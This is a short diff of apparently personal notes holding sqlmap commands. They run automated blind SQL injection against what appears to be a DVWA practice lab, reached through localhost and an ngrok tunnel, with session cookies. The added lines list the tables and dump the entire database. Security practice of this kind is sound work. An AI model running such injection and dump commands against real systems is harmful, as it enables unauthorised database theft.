@@ -19,4 +19,7 @@ python sqlmap.py --url="??????????" --cookie="????????"
 python sqlmap.py --url="https://a778-212-39-129-107.ngrok-free.app/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=m97vsqttahg9irjbjtlb4apq13&security=low"
 
 
-python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267&security=low" --level=5
+python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --tables --batch
+
+
+python sqlmap.py --url="http://localhost:9001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=l3r1ijlj6cesmulv2mk1gi6267"  --dump-all --batch --threads 5
